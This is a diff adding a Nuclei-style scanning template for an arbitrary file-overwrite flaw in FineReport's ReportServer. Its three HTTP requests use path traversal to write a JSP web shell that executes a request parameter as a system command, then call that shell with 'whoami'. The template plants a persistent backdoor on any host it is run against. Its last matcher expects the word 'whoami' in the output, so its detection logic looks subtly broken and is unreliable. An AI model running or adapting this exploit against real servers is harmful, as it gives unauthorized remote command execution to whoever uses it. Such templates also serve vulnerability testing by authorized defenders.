@@ -1,0 +1,61 @@
+id: finereport-reportserver-file-overwrite-getshell
+info:
+  name: FineReport ReportServer File Overwrite getshell
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    FineReport has an arbitrary file overwrite vulnerability, allowing the upload of JSP Trojans. You need to find the existing JSP file to overwrite.
+  tags: getshell
+  reference:
+    - http://fofa.so
+
+variables:
+  randomFlag: '{{rand_base(16)}}'
+
+http:
+  - raw:
+      - |
+        POST /WebReport/ReportServer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"__CONTENT__":"hello,world","cmd":"design_save_svg","op":"svginit","filePath":"httpchartmapsvg/../../../log.svg.jsp"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "hello,world"
+        part: body
+
+  - raw:
+      - |
+        POST /WebReport/ReportServer HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {"__CONTENT__":"<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\"cmd\\")).getInputStream();int a = -1;byte[] b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>","cmd":"design_save_svg","op":"svginit","filePath":"httpchartmapsvg/../../../log.svg{{randomFlag}}.jsp"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - raw:
+      - |
+        GET /WebReport/log.svg{{randomFlag}}.jsp?cmd=whoami HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "whoami"
+        part: body
+      - type: regex
+        regex:
+          - "[a-zA-Z0-9-_]+"  # Match expected output from whoami command.
